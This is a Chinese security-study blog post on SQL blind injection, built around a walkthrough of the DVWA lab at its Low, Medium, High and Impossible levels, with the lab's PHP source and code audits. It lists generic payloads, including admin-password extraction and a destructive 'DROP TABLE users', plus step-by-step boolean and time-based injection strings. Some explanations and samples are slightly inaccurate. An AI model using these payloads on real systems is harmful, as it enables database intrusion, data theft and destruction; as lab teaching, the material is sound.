---
title: "sql盲注"
date: 2026-04-07
published: 2026-04-07
author: Rin
permalink: /posts/网安笔记/web漏洞/sql注入/sql盲注/
categories:
  - 网安笔记
  - web漏洞
  - sql注入
  - sql盲注
tags:
  - Study
---

## 概念详解

SQL注入（Blind）是一种常见的安全漏洞，它允许攻击者向应用程序的数据库中执行恶意的SQL查询。

在传统的SQL注入攻击中，攻击者可以直接获取到应用程序返回的数据库错误信息或查询结果，从而了解到他们所注入的恶意SQL语句是否生效。 **但在盲注（Blind）注入中，攻击者无法直接获取到这些信息，因此称之为"盲注"。**

在盲注攻击中，攻击者通过构造恶意的注入语句，将其输入传递给应用程序处理。然后，攻击者观察应用程序的响应或其他可见的行为来确定注入是否成功，并进一步探测和利用数据库中的数据。

## 盲注主要形式

`盲注的两种主要形式是：`
	
1. 基于布尔的盲注（Boolean-based Blind Injection）：攻击者通过注入条件语句，利用应用程序中基于布尔条件的判断来获取有关数据库内容的信息。攻击者可以尝试不同的条件并根据应用程序的响应来验证其正确性。**页面会返回报错信息**
    
2. 基于时间的盲注（Time-based Blind Injection）：攻击者在注入语句中使用延时函数或计算耗时操作，以`观察应用程序对恶意查询的处理时间`。通过观察响应时间的变化，攻击者可以逐渐推断数据库中的数据。**页面不会返回任何报错信息**  
    基于时间的盲注通常会使用一些可能引起延迟或错误的操作，如`睡眠函数sleep()、错误的 SQL 语句或其他耗时的操作。`
    

## SQL盲注常见Payload

基于布尔盲注Payload：

1. `id=1 AND (SELECT COUNT(*) FROM users) > 0`
2. `id=1 AND SUBSTRING((SELECT version()), 1, 1) = '5'`
3. `id=1 AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1)) = 97`
4. `id=1 AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='public') > 10`
5. `id=1 AND LENGTH((SELECT database())) = 6`

基于时间盲注Payload：

1. `id=1; IF((SELECT COUNT(*) FROM users) > 0, SLEEP(5), NULL)`
2. `id=1; IF((SELECT ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1))) = 97, BENCHMARK(10000000, MD5('a')), NULL)`
3. `id=1; IF(EXISTS(SELECT * FROM information_schema.tables WHERE table_schema='public' AND table_name='users'), BENCHMARK(5000000, SHA1('a')), NULL)`
4. `id=1; IF((SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users') = 5, SLEEP(2), NULL)`
5. `id=1; IF((SELECT SUM(LENGTH(username)) FROM users) > 20, BENCHMARK(3000000, MD5('a')), NULL)`

错误基于盲注Payload：

1. `id=1 UNION ALL SELECT 1,2,table_name FROM information_schema.tables`
2. `id=1 UNION ALL SELECT 1,2,column_name FROM information_schema.columns WHERE table_name='users'`
3. `id=1 UNION ALL SELECT username,password,3 FROM users`
4. `id=1'; SELECT * FROM users WHERE username='admin' --`
5. `id=1'; DROP TABLE users; --`

---

**本文以布尔盲注及时间盲注结合DVWA之 SQL Injection Blind进行实例讲解**

`因知识点较多且姿势复杂，致使篇幅过长，请读者耐心学习。`

---

## Low level

![在这里插入图片描述](https://img-blog.csdnimg.cn/6913e9f472dc497aa03b8365660cfea2.png#pic_center)

### 源代码

```php
<?php

if( isset( $_GET[ 'Submit' ] ) ) {
    // Get input
    $id = $_GET[ 'id' ];
    $exists = false;

    switch ($_DVWA['SQLI_DB']) {
        case MYSQL:
            // Check database
            $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
            $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ); // Removed 'or die' to suppress mysql errors

            $exists = false;
            if ($result !== false) {
                try {
                    $exists = (mysqli_num_rows( $result ) > 0);
                } catch(Exception $e) {
                    $exists = false;
                }
            }
            ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
            break;
        case SQLITE:
            global $sqlite_db_connection;

            $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
            try {
                $results = $sqlite_db_connection->query($query);
                $row = $results->fetchArray();
                $exists = $row !== false;
            } catch(Exception $e) {
                $exists = false;
            }

            break;
    }

    if ($exists) {
        // Feedback for end user
        echo '<pre>User ID exists in the database.</pre>';
    } else {
        // User wasn't found, so the page wasn't!
        header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' );

        // Feedback for end user
        echo '<pre>User ID is MISSING from the database.</pre>';
    }

}

?> 
```

代码的主要逻辑如下：

1. 首先，代码检查是否接收到名为 "Submit" 的 GET 请求参数，以确定用户是否提交了表单。
    
2. 如果提交了表单，则获取用户输入的ID 并将 "exists" 变量设置为 false。
    
3. 根据配置的数据库类型（可以是MySQL或SQLite），代码会构建不同的查询语句。
    
4. 对于MySQL数据库，代码使用mysqli库执行查询，并判断结果是否为空。
    
5. 对于SQLite数据库，代码使用sqlite3库执行查询，并检查返回结果是否非空。
    
6. 如果查询结果不为空，则将 "exists" 变量设置为 true，表示用户ID在数据库中存在。
    
7. 如果 "exists" 变量为 true，则显示 "User ID exists in the database." 的消息。
    
8. 如果 "exists" 变量为 false，则发送 404 Not Found 错误头，并显示 "User ID is MISSING from the database." 的消息。
    

**在构建 SQL 查询语句时，程序直接使用用户输入的ID，而没有对其进行任何验证或过滤。** ==因此可以通过输入恶意的ID 来执行任意的SQL 查询。==

### 布尔盲注

#### 判断注入类型

输入`1' or 1=1#`，回显：User ID exists in the database.  
输入`1' or 1=2#`，回显：User ID is MISSING from the database.  
说明注入类型为**字符型盲注**  
猜测后端语句为：

```sql
SELECT first_name, last_name FROM users WHERE user_id = '参数';
```

#### 获取数据库名

##### 判断数据库名称长度

使用 `length函数` 判断数据库名称长度

构造POC如下：

```sql
1' and length(database())>20 #
//判断数据库名称长度是否大于20
```

`length()` 是一个常见的 SQL 函数，用于计算字符串的长度。它可用于不同的数据库系统（如 MySQL、SQLite、Oracle 等）。

该函数的语法一般为：

```sql
LENGTH(string)
```

其中，`string` 是需要计算长度的字符串或列名。

例如，在 MySQL 中，可以使用 `length()` 函数来计算字符串长度，如下所示：

```sql
SELECT length('Hello World');  -- 输出 11
SELECT length(column_name) FROM table_name;  -- 计算表中某一列的长度
```

回显如下：

![在这里插入图片描述](https://img-blog.csdnimg.cn/660013bca4814f7c99786ce734960beb.png#pic_center)  
说明数据库名称长度小于20，故使用**二分法思维**进行判断。

若不了解二分法，可参考：[百度百科：二分法思维及应用](https://baike.baidu.com/item/%E4%BA%8C%E5%88%86%E6%B3%95/1364267?fr=aladdin)

构造POC如下：

```sql
1' and length(database())>10 #
//判断数据库名称长度是否大于10
```

回显如下：

![在这里插入图片描述](https://img-blog.csdnimg.cn/26084e585b1b4da29c12fd13b44966aa.png#pic_center)  
说明数据库名称长度小于10，不断尝试后得到数据库名称长度为4：

![在这里插入图片描述](https://img-blog.csdnimg.cn/c8aec5b1f9544e4c9c5cfb8ea68413d2.png#pic_center#pic_center)

##### 获取数据库名称组成

```sql
1' and ascii(substr(database(),1,1))>20 # 
```

ascii(substr(database(),1,1)) 是一个函数表达式，用于提取数据库名称的第一个字符并获取其 ASCII 值。  
substr(database(),1,1) 表示从数据库名称中提取一个字符，参数 1,1 表示提取位置为 1、长度为 1。  
`>用于判断左侧的值是否大于右侧的值`

![在这里插入图片描述](https://img-blog.csdnimg.cn/a75d41087bd340f2a9ffd38fc161918c.png#pic_center)由回显可知，数据库名称第一个字符的ASCII码大于20

```sql
1' and ascii(substr(database(),1,1))<101 #  
//经测试 回显exist

1' and ascii(substr(database(),1,1))>100 #
//经测试 回显exist  
```

故数据库名称第一个字符的ASCII码为100，即`d`

同理，可推断第二个字符、第三个字符、第四个字符的ASCII值

```sql
1' and ascii(substr(database(),2,1)) 判断表达式 #  
1' and ascii(substr(database(),3,1)) 判断表达式 #  
1' and ascii(substr(database(),4,1)) 判断表达式 #  
```

得到数据库名称为`dvwa`

#### 获取表名

`由于一个数据库可能存在多个表名，故先判断表个数。`

##### 判断表个数

构造POC如下：

```sql
1' and (select count(table_name) from information_schema.tables where table_schema=database()) <10#
```

count(table_name) 是一个聚合函数，用于统计满足特定条件的行数（即表的数量）。

回显如下：

![在这里插入图片描述](https://img-blog.csdnimg.cn/fba8abdaa32b4aae8a09d9f824bb0956.png#pic_center)经过不断测试得表个数为 `2`

##### 获取表名称长度

判断第一个表名称长度

构造POC如下：

```sql
1' and length((select table_name from information_schema.tables where table_schema=database() limit 0,1)) > 10 #
```

(select table_name from information_schema.tables where table_schema=database() limit 0,1) 是一个子查询，用于从信息模式中选择第一个表名。  
limit 0,1 用于限制只返回第一个结果。  
length(...) 返回提取字符串的长度。

回显如下：

![在这里插入图片描述](https://img-blog.csdnimg.cn/f97219d41426492aba60162a3055e33c.png#pic_center)

不断测试得知第一个表名称长度为 `9`

同理，由以下语句得到第二个表名称长度为 `5`

```sql
1' and length((select table_name from information_schema.tables where table_schema=database() limit 1,1)) =5 #
```

limit 1,1用于限制只返回第二个结果

![在这里插入图片描述](https://img-blog.csdnimg.cn/b61f14ec70904c83b4f770194fe0f34a.png#pic_center)

##### 获取表名称组成

**判断第一个表名称组成**

构造POC如下：

```sql
1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>100 #     
```

ascii(substr((select table_name from information_schema.tables where ==table_schema=database() limit 0,1),1,1))>100 是一个子查询，目的是对数据库中第一个表名的第一个字符进行 ASCII 值的比较。==

select table_name from information_schema.tables where table_schema=database() limit 0,1 是一个子查询，用于从信息模式中获取数据库中的第一个表名。  
**substr(...,1,1) 用于提取字符串的第一个字符。**  
**ascii(...) 是一个函数，用于获取给定字符的 ASCII 值。**

回显如下：

![在这里插入图片描述](https://img-blog.csdnimg.cn/607434360af9497eabccf8027d0ecbf7.png#pic_center#pic_center)  
经过不断测试得该语句返回exists：

```sql
1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=103 #     
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/a82def8ddd6e4a7f92ecf11fffd5de53.png#pic_center)  
同理，可推断第二个字符、第三个字符至第九个字符的ASCII值

```sql
//第二个字符
1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))判断表达式 #   

//第三个字符
1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),3,1))判断表达式 #   

//第四个字符
1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),4,1))判断表达式 #   

//以此类推
```

最终达到第一个表名称组成 guestbook

**判断第二个表名称组成**

由上已知第二个表名称长度为 `5`

同上，判断第二个表名称组成：

```sql
//第一个字符
1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))判断表达式 #     

//第二个字符
1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),2,1))判断表达式 #     

//第三个字符
1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),2,1))判断表达式 #     
```

如下图，第一个字符为 `u`

![在这里插入图片描述](https://img-blog.csdnimg.cn/3afdc07d7dd54b298e9e9f9f628b097e.png#pic_center)  
最终得到第二个表名称组成 `users`

#### 获取列名

`表中可能存在多列，故先获取列数。`

##### 获取列数

```sql
1' and (select count(column_name) from information_schema.columns where table_schema=database() and table_name='表名')判断表达式 # 
```

以 `users表` 为例

输入：

```sql
1' and (select count(column_name) from information_schema.columns where table_schema=database() and table_name='users')=8 # 
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/4034ded3cba8431f83fe3d3574b8151b.png#pic_center)  
回显exists，说明 `users` 表有 `8` 列

##### 获取列名长度

```sql
//判断第一个列名长度
1' and length(substr((select column_name from information_schema.columns where table_name= 'users' limit 0,1),1))判断表达式 #

//判断第二个列名长度
1' and length(substr((select column_name from information_schema.columns where table_name= 'users' limit 1,1),1))判断表达式 #
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/5516a0af59de4442993382b6980c6628.png#pic_center)  
由上图可知第一个列名长度为 `7`

#### 获取列名字符组成

```sql
//获取 users 表中第一个列名的第一个字符
1' and ascii(substr((select column_name from information_schema.columns where table_name = 'users' limit 0,1),1,1))判断表达式 #

//获取 users 表中第二个列名的第一个字符
1' and ascii(substr((select column_name from information_schema.columns where table_name = 'users' limit 1,1),1,1))判断表达式 #

//获取 users 表中第三个列名的第一个字符
1' and ascii(substr((select column_name from information_schema.columns where table_name = 'users' limit 2,1),1,1))判断表达式 #

//获取 users 表中第三个列名的第二个字符
1' and ascii(substr((select column_name from information_schema.columns where table_name = 'users' limit 2,1),2,1))判断表达式 #

//获取 users 表中第三个列名的第三个字符
1' and ascii(substr((select column_name from information_schema.columns where table_name = 'users' limit 2,1),3,1))判断表达式 #
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/38854131cb2f467eaa2d29c02a02702f.png#pic_center)由上图可知 `users` 表中第一个列名的第一个字符为 `u`

#### 获取字段

由上文不难得到 `users` 表其中一个列名为 `user`

##### 获取字段长度

```sql
//获取列中第一个字段长度
1' and length(substr((select user from users limit 0,1),1))判断表达式 #

//获取列中第二个字段长度
1' and length(substr((select user from users limit 1,1),1))判断表达式 #
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/57a75fe1751e4dc5af5e15d3314db84d.png#pic_center)  
由上图可得第一个字段长度为 `5`

##### 获取字段

```sql
//获取第一个字段的第一个字符
1' and ascii(substr((select user from users limit 0,1),1,1))判断表达式 #

//获取第一个字段的第二个字符
1' and ascii(substr((select user from users limit 0,1),2,1))判断表达式 #

//获取第二个字段的第一个字符
1' and ascii(substr((select user from users limit 1,1),1,1))判断表达式 #

//获取第二个字段的第二个字符
1' and ascii(substr((select user from users limit 1,1),2,1))判断表达式 #

//以此类推
```

如下图，第一个字段的第一个字符为 `a`

![在这里插入图片描述](https://img-blog.csdnimg.cn/ceeb58668cbd4e6081c63c2b7b02183a.png#pic_center)

至此，SQL之布尔盲注攻击姿势及解题详析已完成，接着分析时间盲注。

---

### 时间盲注

#### 判断注入类型

输入

```sql
1' and sleep(5) #
```

发现时间延迟

输入

```sql
1 and sleep(5) #
```

时间并未延迟，说明没有闭合单引号会导致语句错误  
因此后端为单引号字符型查询

#### 获取数据库名

##### 判断数据库名称长度

输入

```sql
1' and if(length(database())=1,sleep(5),1) 
```

`if(expr1,expr2,expr3)函数：`

如果 expr1 是TRUE ，则 if()的返回值为expr2; 否则返回值则为 expr3。  
==if() 的返回值为数字值或字符串值==

输入上面语句后，页面并没有延迟，说明`length(database())=1` 为假

```cpp
1' and if(length(database())=2,sleep(5),1) # 没有延迟
1' and if(length(database())=3,sleep(5),1) # 没有延迟
1' and if(length(database())=4,sleep(5),1) # 明显延迟
```

说明数据库名称长度为 `4`

##### 判断数据库名称组成

判断第一个字符，输入

```sql
1' and if(ascii(substr(database(),1,1))>90,sleep(5),1)#
```

页面延迟明显，说明第一个字符的ASCII值大于90

输入

```sql
1' and if(ascii(substr(database(),1,1))=100,sleep(5),1)#
```

页面延迟明显，说明第一个字符为 `d`

同理

```cpp
//判断第二个字符
1' and if(ascii(substr(database(),2,1))判断表达式,sleep(5),1)#

//判断第三个字符
1' and if(ascii(substr(database(),3,1))判断表达式,sleep(5),1)#

//判断第四个字符
1' and if(ascii(substr(database(),4,1))判断表达式,sleep(5),1)#
```

最终得到数据库名为 `dvwa`

#### 获取表名

`由于一个数据库可能有多个表，故先判断表个数。`

##### 判断表个数

输入

```sql
1' and if((select count(table_name) from information_schema.tables where table_schema=database())=2,sleep(5),1) 
```

页面延迟明显，说明表个数为 `2`

##### 获取表名称长度

获取第一个表名称长度：

输入

```sql
1' and if(length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=9,sleep(5),1) #
```

延迟明显，说明第一个表名称长度为 `9`

同理

```sql
1' and if(length((select table_name from information_schema.tables where table_schema=database() limit 1,1))=5,sleep(5),1) #
```

第二个表名称长度为 `5`

##### 获取表名称组成

以第一个表的名称组成为例：  
输入以下语句即可获得第一个表名称的第一个字符：

```sql
1' and (select ascii(substr(table_name, 1, 1)) from information_schema.tables where table_schema = 'dvwa' limit 1) >= 100 and sleep(5)#
```

页面延迟明显，说明第一个字符的ASCII值大于等于100

```sql
1' and (select ascii(substr(table_name, 1, 1)) from information_schema.tables where table_schema = 'dvwa' limit 1) = 103 and sleep(5)#

```

延迟明显，说明第一个表名称的第一个字符为 `g`

```sql
//获得第一个表名称的第二个字符
1' and (select ascii(substr(table_name, 2, 1)) from information_schema.tables where table_schema = 'dvwa' limit 1)判断表达式 and sleep(5)#

//获得第一个表名称的第三个字符
1' and (select ascii(substr(table_name, 3, 1)) from information_schema.tables where table_schema = 'dvwa' limit 1)判断表达式 and sleep(5)#
```

最终得到第一个表名称为 `guestbook`

```sql
//获得第二个表名称的第一个字符
1' and (select ascii(substr(table_name, 1, 1)) from (select table_name from information_schema.tables where table_schema = 'dvwa' limit 1,1) as second_table limit 1) 判断表达式 and sleep(5)#

//获得第二个表名称的第二个字符
1' and (select ascii(substr(table_name, 2, 1)) from (select table_name from information_schema.tables where table_schema = 'dvwa' limit 1,1) as second_table limit 1) 判断表达式 and sleep(5)#

//获得第二个表名称的第三个字符
1' and (select ascii(substr(table_name, 3, 1)) from (select table_name from information_schema.tables where table_schema = 'dvwa' limit 1,1) as second_table limit 1) 判断表达式 and sleep(5)#

//以此类推
```

#### 获取列名

`表中可能存在多列，故先获取列数。`

##### 获取列数

以 `guestbook` 表为例

输入

```sql
1' and if((select count(column_name) from information_schema.columns where table_schema=database() and table_name= 'guestbook')=3,sleep(5),1) # 
```

延迟明显，说明列数为 `3`

##### 获取列名长度

获取第一列名称长度

```sql
1' and if(length(substr((select column_name from information_schema.columns where table_name= 'guestbook' limit 0,1),1))判断表达式,sleep(5),1) #
```

输入：

```sql
1' and if(length(substr((select column_name from information_schema.columns where table_name= 'guestbook' limit 0,1),1))=10,sleep(5),1) #
```

延迟明显，说明第一列名称长度为 `10`

```sql
//获取第二列名称长度
1' and if(length(substr((select column_name from information_schema.columns where table_name= 'guestbook' limit 1,1),1))判断表达式,sleep(5),1) #
```

#### 获取列名字符组成

以 `guestbook` 表为例

获取第一个列名的第一个字符

```sql
1' and if((select ascii(substr(column_name, 1, 1)) from information_schema.columns where table_name = 'guestbook' limit 0,1) = 判断表达式, sleep(5), 1) #
```

经验证，第一个列名的第一个字符的ASCII值为 `99` ，即 `c`

```sql
//获取第一个列名的第二个字符
1' and if((select ascii(substr(column_name, 2, 1)) from information_schema.columns where table_name = 'guestbook' limit 0,1) = 判断表达式, sleep(5), 1) #

//获取第一个列名的第三个字符
1' and if((select ascii(substr(column_name, 3, 1)) from information_schema.columns where table_name = 'guestbook' limit 0,1) = 判断表达式, sleep(5), 1) #

//获取第二个列名的第一个字符
1' and if((select ascii(substr(column_name, 1, 1)) from information_schema.columns where table_name = 'guestbook' limit 1,1) = ASCII_VALUE, sleep(5), 1) #

//获取第二个列名的第二个字符
1' and if((select ascii(substr(column_name, 2, 1)) from information_schema.columns where table_name = 'guestbook' limit 1,1) = ASCII_VALUE, sleep(5), 1) #

//获取第二个列名的第三个字符
1' and if((select ascii(substr(column_name, 3, 1)) from information_schema.columns where table_name = 'guestbook' limit 1,1) = ASCII_VALUE, sleep(5), 1) #

//获取第三个列名的第一个字符
1' and if((select ascii(substr(column_name, 1, 1)) from information_schema.columns where table_name = 'guestbook' limit 2,1) = ASCII_VALUE, sleep(5), 1) #
```

#### 获取字段

以 `users`表的 `user`列名 为例

获取 `user` 列名的第一个字段的第一个字符

```sql
1' and if((select ascii(substring(column_name, 1, 1)) from information_schema.columns where table_name = 'users' limit 0,1)判断表达式, sleep(5), 1) #
```

输入：

```sql
1' and if((select ascii(substring(column_name, 1, 1)) from information_schema.columns where table_name = 'users' limit 0,1)=117, sleep(5), 1) #
```

延迟明显，说明 `user` 列名的第一个字段的第一个字符为 `u`

```sql
//获取 user 列名的第一个字段的第二个字符
1' and if((select ascii(substring(column_name, 2, 1)) from information_schema.columns where table_name = 'users' limit 0,1)判断表达式, sleep(5), 1) #

//获取 user 列名的第一个字段的第三个字符
1' and if((select ascii(substring(column_name, 3, 1)) from information_schema.columns where table_name = 'users' limit 0,1)判断表达式, sleep(5), 1) #

------------

//获取 user 列名的第二个字段的第一个字符
1' and if((SELECT ASCII(SUBSTRING(column_name, 1, 1)) FROM information_schema.columns WHERE table_name = 'users' LIMIT 1, 1)判断表达式, sleep(5), 1) #

//获取 user 列名的第二个字段的第二个字符
1' and if((SELECT ASCII(SUBSTRING(column_name, 2, 1)) FROM information_schema.columns WHERE table_name = 'users' LIMIT 1, 1)判断表达式, sleep(5), 1) #

//获取 user 列名的第二个字段的第三个字符
1' and if((select ascii(substring(column_name, 3, 1)) from information_schema.columns where table_name = 'users' limit 1,1)判断表达式, sleep(5), 1) #
```

自此，SQL之时间盲注攻击姿势及解题详析已完成。

## Medium level

![在这里插入图片描述](https://img-blog.csdnimg.cn/9c699a13db1142769b81dacbf76c0d0b.png#pic_center)

### 源代码

```php
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $id = $_POST[ 'id' ];
    $exists = false;

    switch ($_DVWA['SQLI_DB']) {
        case MYSQL:
            $id = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $id ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

            // Check database
            $query  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
            $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ); // Removed 'or die' to suppress mysql errors

            $exists = false;
            if ($result !== false) {
                try {
                    $exists = (mysqli_num_rows( $result ) > 0); // The '@' character suppresses errors
                } catch(Exception $e) {
                    $exists = false;
                }
            }
            
            break;
        case SQLITE:
            global $sqlite_db_connection;
            
            $query  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
            try {
                $results = $sqlite_db_connection->query($query);
                $row = $results->fetchArray();
                $exists = $row !== false;
            } catch(Exception $e) {
                $exists = false;
            }
            break;
    }

    if ($exists) {
        // Feedback for end user
        echo '<pre>User ID exists in the database.</pre>';
    } else {
        // Feedback for end user
        echo '<pre>User ID is MISSING from the database.</pre>';
    }
}

?> 
```

### 代码审计

1. 首先，代码检查是否存在名为 Submit 的表单提交。如果存在，说明用户已经提交了表单数据。
    
2. 接下来，代码获取用户输入的ID，并将其保存在变量 `$id` 中。
    
3. 代码通过 switch 语句根据配置的数据库类型执行不同的查询操作。这里包括两种数据库类型：MYSQL 和 SQLITE。
    
4. 对于 MYSQL 数据库类型，代码首先对输入的 ID 进行转义处理，使用 `mysqli_real_escape_string` 函数，转义字符串中的特殊字符，包括单引号。然后，构建一个查询语句，从名为 "users" 的表中检索具有匹配的 "user_id" 的记录的 "first_name" 和 "last_name" 字段。查询语句保存在 `$query` 变量中。
    
5. 代码使用 `mysqli_query` 函数执行查询，并将结果保存在变量 `$result` 中。
    
6. 如果查询结果不为 false，则尝试获取查询结果的行数，并将 `$exists` 设置为 true，表示数据库中存在与提供的 ID 匹配的用户记录。
    
7. 对于 SQLITE 数据库类型，代码使用全局变量 `$sqlite_db_connection` 连接到 SQLite 数据库。然后，执行与 MYSQL 类似的查询操作，并将结果保存在变量 `$results` 中。
    
8. 最后，根据 `$exists` 的值向最终用户提供反馈信息。如果 `$exists` 为 true，则显示 "User ID exists in the database."，否则显示 "User ID is MISSING from the database."。
    

### 攻击姿势

抓包：

![在这里插入图片描述](https://img-blog.csdnimg.cn/53cdcd5d92d946c0aa99acfa1cc00cc2.png#pic_center)  
由于单引号等字符被转义，故考虑`数字型注入`或者`宽字节注入`

POST：`Submit=Submit & id=1 and 1=1 #` **注意：若id测试位于&前，则#会注释Submit，达不到POST提交效果**

![在这里插入图片描述](https://img-blog.csdnimg.cn/6e56cd8bccc74cf1b0968cf0db4e5248.png#pic_center)  
回显exists

POST：`Submit=Submit & id=1 and 1=2 #`

![在这里插入图片描述](https://img-blog.csdnimg.cn/72ee463684004ad29398e2014448359a.png#pic_center)  
回显Missing  
说明注入类型为`数字型盲注`  
猜测后端语句为：

```sql
SELECT first_name, last_name FROM users WHERE user_id = 参数;
```

之后的步骤同**Low级别**，既可使用`Burp`进行测试，也可使用`Hackbar`进行渗透攻击，本文不再赘述。

## High level

### 源代码

```php
<?php

if( isset( $_COOKIE[ 'id' ] ) ) {
    // Get input
    $id = $_COOKIE[ 'id' ];
    $exists = false;

    switch ($_DVWA['SQLI_DB']) {
        case MYSQL:
            // Check database
            $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
            $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ); // Removed 'or die' to suppress mysql errors

            $exists = false;
            if ($result !== false) {
                // Get results
                try {
                    $exists = (mysqli_num_rows( $result ) > 0); // The '@' character suppresses errors
                } catch(Exception $e) {
                    $exists = false;
                }
            }

            ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
            break;
        case SQLITE:
            global $sqlite_db_connection;

            $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
            try {
                $results = $sqlite_db_connection->query($query);
                $row = $results->fetchArray();
                $exists = $row !== false;
            } catch(Exception $e) {
                $exists = false;
            }

            break;
    }

    if ($exists) {
        // Feedback for end user
        echo '<pre>User ID exists in the database.</pre>';
    }
    else {
        // Might sleep a random amount
        if( rand( 0, 5 ) == 3 ) {
            sleep( rand( 2, 4 ) );
        }

        // User wasn't found, so the page wasn't!
        header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' );

        // Feedback for end user
        echo '<pre>User ID is MISSING from the database.</pre>';
    }
}

?> 
```

### 代码审计

1. 首先，代码通过检查是否存在名为 "id" 的cookie来判断用户是否提供了ID。
    
2. 接下来，代码使用 `$id = $_COOKIE['id'];` 将用户提供的ID保存到变量 `$id` 中。
    
3. 代码定义了一个布尔变量 `$exists`，用于表示ID是否存在于数据库中，初始化为 `false`。
    
4. 根据配置文件中指定的数据库类型（MySQL 或 SQLite），代码将执行不同的数据库查询。
    
5. 对于 MySQL 数据库，代码构建了一个查询语句 `$query`，通过将用户提供的ID插入到查询语句中进行查询。然后，使用 `mysqli_query()` 函数执行查询，并将结果保存在变量 `$result` 中。
    
6. 如果查询结果不为 `false`，则尝试获取查询结果的行数，并将布尔变量 `$exists` 设置为行数是否大于 0。通过 `mysqli_num_rows()` 函数获取结果集中的行数，并将结果与 0 进行比较。
    
7. 对于 SQLite 数据库，代码首先获取全局变量 `$sqlite_db_connection`，该变量是一个 SQLite 数据库连接对象。然后，构建一个查询语句 `$query`，通过将用户提供的ID插入到查询语句中进行查询。接着，使用 `$sqlite_db_connection->query($query)` 执行查询，并将结果保存到变量 `$results` 中。最后，通过检查结果数组 `$row` 是否为 `false` 来设置布尔变量 `$exists`。
    
8. 如果 `$exists` 为 `true`，则打印出 "User ID exists in the database." 的提示信息。
    
9. 如果 `$exists` 为 `false`，则根据代码的逻辑，有时会调用 `sleep()` 函数暂停执行一段随机时间。**用于防止时间盲注** 然后，将 HTTP 响应标头设置为 "404 Not Found" 并打印出 "User ID is MISSING from the database." 的提示信息。
    

### 攻击姿势

![在这里插入图片描述](https://img-blog.csdnimg.cn/0546a31f4cbb4a8c8796a63cb996e0d3.png#pic_center)

![在这里插入图片描述](https://img-blog.csdnimg.cn/8f4d8d3a8be7415cb1a9e671f8ec33c9.png#pic_center)  
由上面两张图可知，该注入类型为**字符型SQL盲注**

注入姿势同上，不再赘述。

以下附图：

判断数据库名称长度：

![在这里插入图片描述](https://img-blog.csdnimg.cn/9b90ad65040445108accca0f0e05d760.png#pic_center)  
判断表个数：

![在这里插入图片描述](https://img-blog.csdnimg.cn/c4144a039cab407d90800e3c5c971a5d.png#pic_center)

## Impossible level

### 源代码

```php
<?php

if( isset( $_GET[ 'Submit' ] ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
    $exists = false;

    // Get input
    $id = $_GET[ 'id' ];

    // Was a number entered?
    if(is_numeric( $id )) {
        $id = intval ($id);
        switch ($_DVWA['SQLI_DB']) {
            case MYSQL:
                // Check the database
                $data = $db->prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' );
                $data->bindParam( ':id', $id, PDO::PARAM_INT );
                $data->execute();

                $exists = $data->rowCount();
                break;
            case SQLITE:
                global $sqlite_db_connection;

                $stmt = $sqlite_db_connection->prepare('SELECT COUNT(first_name) AS numrows FROM users WHERE user_id = :id LIMIT 1;' );
                $stmt->bindValue(':id',$id,SQLITE3_INTEGER);
                $result = $stmt->execute();
                $result->finalize();
                if ($result !== false) {
                    // There is no way to get the number of rows returned
                    // This checks the number of columns (not rows) just
                    // as a precaution, but it won't stop someone dumping
                    // multiple rows and viewing them one at a time.

                    $num_columns = $result->numColumns();
                    if ($num_columns == 1) {
                        $row = $result->fetchArray();

                        $numrows = $row[ 'numrows' ];
                        $exists = ($numrows == 1);
                    }
                }
                break;
        }

    }

    // Get results
    if ($exists) {
        // Feedback for end user
        echo '<pre>User ID exists in the database.</pre>';
    } else {
        // User wasn't found, so the page wasn't!
        header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' );

        // Feedback for end user
        echo '<pre>User ID is MISSING from the database.</pre>';
    }
}

// Generate Anti-CSRF token
generateSessionToken();

?> 
```

### 代码审计

1. 首先，代码通过检查是否有名为 "Submit" 的GET参数来判断是否提交了表单。
    
